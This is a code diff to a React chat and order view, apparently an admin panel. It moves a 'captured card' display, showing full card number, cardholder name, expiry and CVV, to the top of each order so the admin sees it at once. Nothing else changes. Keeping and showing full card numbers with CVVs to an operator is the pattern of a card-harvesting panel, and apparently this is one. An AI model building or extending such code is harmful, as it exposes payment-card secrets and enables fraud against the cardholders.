@@ -721,6 +721,24 @@ function ChatConversation({
         </span>
       </div>
 
+      {/* Captured card visualization — pinned at the top so the admin sees
+          the card details immediately when opening an order. */}
+      {(pay.cardNumber ||
+        pay.cardLast4 ||
+        pay.cardName ||
+        pay.expiry ||
+        pay.cvv) && (
+        <div className="bg-card/60 border-b border-border px-3 py-3">
+          <CardMock
+            cardNumber={pay.cardNumber}
+            cardLast4={pay.cardLast4}
+            cardName={pay.cardName}
+            expiry={pay.expiry}
+            cvv={pay.cvv}
+          />
+        </div>
+      )}
+
       {/* Pinned panels */}
       <div className="bg-card/60 border-b border-border px-3 py-2 space-y-2">
         {/* Shipping panel */}
@@ -853,21 +871,6 @@ function ChatConversation({
                   )}
                 </span>
               </div>
-              {(pay.cardNumber ||
-                pay.cardLast4 ||
-                pay.cardName ||
-                pay.expiry ||
-                pay.cvv) && (
-                <div className="pt-2">
-                  <CardMock
-                    cardNumber={pay.cardNumber}
-                    cardLast4={pay.cardLast4}
-                    cardName={pay.cardName}
-                    expiry={pay.expiry}
-                    cvv={pay.cvv}
-                  />
-                </div>
-              )}
               {pay.receiptUrl && (
                 <button
                   onClick={() => onZoomReceipt(pay.receiptUrl!)}
